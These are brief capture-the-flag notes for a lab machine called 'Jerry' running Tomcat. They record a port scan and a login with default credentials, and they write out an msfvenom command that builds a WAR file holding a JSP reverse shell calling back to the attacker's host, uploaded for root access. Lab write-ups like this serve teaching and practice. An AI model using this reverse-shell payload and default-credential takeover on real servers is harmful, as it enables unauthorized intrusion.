```Jerry 10.10.10.95```

- nmap revealed a port is open at 8500
- basic Tomcat web server.
- logged in with default creds which is shown on the screen.
- .war shell ``` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f war > shell.war```
- upload .war file option is there in the webapp.
- direct system root.